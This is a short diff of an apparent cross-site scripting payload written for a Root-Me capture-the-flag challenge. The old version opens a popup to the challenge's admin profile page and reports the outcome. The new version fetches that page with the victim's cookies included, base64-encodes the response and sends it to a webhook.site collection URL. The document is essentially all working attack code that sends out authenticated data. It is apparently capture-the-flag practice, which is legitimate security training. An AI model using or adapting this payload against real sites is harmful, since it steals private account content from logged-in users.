@@ -1,9 +1,7 @@
 <script>
 var wb='http://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba';
-var ap=window.open('http://challenge01.root-me.org:58003/profile','adminpf');
-// Essaie plusieurs façons de signaler le résultat
-document.write('popup:'+(ap===null?'null':ap===undefined?'undef':'got_obj'));
-setTimeout(function(){
-  new Image().src=wb+'?popup='+(ap===null?'null':ap===undefined?'undef':'obj')+'&href='+(ap&&ap.location?encodeURIComponent(ap.location.href):'na');
-},500);
+fetch('http://challenge01.root-me.org:58003/profile',{credentials:'include',mode:'cors'})
+  .then(r=>r.text())
+  .then(t=>new Image().src=wb+'?cors=ok&d='+btoa(t))
+  .catch(e=>new Image().src=wb+'?cors_err='+btoa(e+''));
 </script>
